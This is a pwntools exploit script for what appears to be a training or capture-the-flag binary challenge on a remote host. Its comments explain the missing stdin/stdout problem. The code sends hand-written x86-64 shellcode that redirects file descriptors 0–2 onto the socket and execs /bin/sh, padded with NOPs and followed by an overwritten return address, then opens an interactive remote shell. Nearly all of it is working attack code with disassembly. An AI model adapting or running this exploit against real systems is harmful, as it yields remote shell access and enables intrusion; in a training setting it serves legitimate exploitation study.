#Need to connect to server via remote (even if it is running locally), running the process locally does not work as it is not using stdin/stdout.
#Even though we can run /bin/sh, as we still dont have stdin, there is no way to interact with the shell through interactive.

#No stdin == no way of sending data to the server after running /bin/sh
#No stdout == no way of receiving data from the server after running /bin/sh

#How do we run "cat flag" and keep reading and writing to the socket file descriptor??
#See:
  #- https://0x00sec.org/t/remote-exploit-shellcode-without-sockets/1440
  #- https://0x00sec.org/t/remote-shells-part-i/269
#We can reroute stdin, stdout and stderr to the fd of the socket.


import pwn

context.terminal = ['tmux', 'splitw', '-h']

# server = pwn.process('./server')

# pwn.gdb.attach(server, """set follow-fork-mode child
#     c
# """)

# input("wait")

# r = pwn.remote('0.0.0.0', 2005)

r = pwn.remote('bin.training.jinblack.it', 2005)

buffer_addr = 0x004040c0

copy_std_fds = b'\x48\xC7\xC0\x20\x00\x00\x00\x48\xC7\xC7\x00\x00\x00\x00\x0F\x05\x48\x89\xC7\x48\xFF\xCF\x48\xC7\xC0\x21\x00\x00\x00\x48\xC7\xC6\x00\x00\x00\x00\x0F\x05\x48\xC7\xC0\x21\x00\x00\x00\x48\xC7\xC6\x01\x00\x00\x00\x0F\x05\x48\xC7\xC0\x21\x00\x00\x00\x48\xC7\xC6\x02\x00\x00\x00\x0F\x05'
#0:  48 c7 c0 20 00 00 00    mov    rax,0x20
#7:  48 c7 c7 00 00 00 00    mov    rdi,0x0
#e:  0f 05                   syscall
#10: 48 89 c7                mov    rdi,rax
#13: 48 ff cf                dec    rdi
#16: 48 c7 c0 21 00 00 00    mov    rax,0x21
#1d: 48 c7 c6 00 00 00 00    mov    rsi,0x0
#24: 0f 05                   syscall
#26: 48 c7 c0 21 00 00 00    mov    rax,0x21
#2d: 48 c7 c6 01 00 00 00    mov    rsi,0x1
#34: 0f 05                   syscall
#36: 48 c7 c0 21 00 00 00    mov    rax,0x21
#3d: 48 c7 c6 02 00 00 00    mov    rsi,0x2
#44: 0f 05                   syscall
open_shell = b'\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh'
#0:  eb 1f                   jmp    0x21
#2:  5e                      pop    rsi
#3:  89 76 08                mov    DWORD PTR [rsi+0x8],esi
#6:  31 c0                   xor    eax,eax
#8:  88 46 07                mov    BYTE PTR [rsi+0x7],al
#b:  89 46 0c                mov    DWORD PTR [rsi+0xc],eax
#e:  b0 0b                   mov    al,0xb
#10: 89 f3                   mov    ebx,esi
#12: 8d 4e 08                lea    ecx,[rsi+0x8]
#15: 8d 56 0c                lea    edx,[rsi+0xc]
#18: cd 80                   int    0x80
#1a: 31 db                   xor    ebx,ebx
#1c: 89 d8                   mov    eax,ebx
#1e: 40 cd 80                rex int 0x80
#21: e8 dc ff ff ff          call   0x2 
shell_code = copy_std_fds + open_shell

r.send(shell_code.ljust(1016, b'\x90') + pwn.p64(buffer_addr))

r.interactive()
